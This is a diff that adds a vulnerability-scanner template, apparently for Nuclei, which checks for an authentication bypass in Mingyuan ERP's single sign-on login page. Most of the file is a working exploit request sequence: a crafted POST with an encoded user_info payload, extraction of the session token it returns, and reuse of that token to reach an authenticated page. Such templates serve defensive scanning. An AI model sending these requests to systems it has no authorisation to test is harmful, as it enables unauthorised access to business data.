@@ -1,0 +1,50 @@
+id: mingyuan-erp-auth-bypass
+
+info:
+  name: Mingyuan ERP ssologin Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    This template checks for an authentication bypass vulnerability in Mingyuan ERP's ssologin functionality.
+    Exploits an issue in the `sso/login.aspx` endpoint to gain unauthorized access.
+  tags: auth-bypass, mingyuan, erp
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: login-auth-bypass
+    raw:
+      - |
+        POST /PubPlatform/nav/login/sso/login.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        __yzsAppSecret=test&user_info=%66%79%6d%71%35%62%49%63%78%58%5a%49%78%75%36%4b%6c%6c%73%46%49%52%32%5a%77%45%4a%4b%2b%56%45%39%35%44%6b%78%2f%43%6e%46%67%46%51%3d
+
+    extractors:
+      - type: regex
+        name: userToken
+        group: 1
+        part: header
+        regex:
+          - "userToken=([A-Za-z0-9]+)"
+        internal: true
+
+  - id: verify-authentication
+    raw:
+      - |
+        GET /PubPlatform/nav/home/default?_nav=0000 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: userToken={{userToken}};
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Welcome"
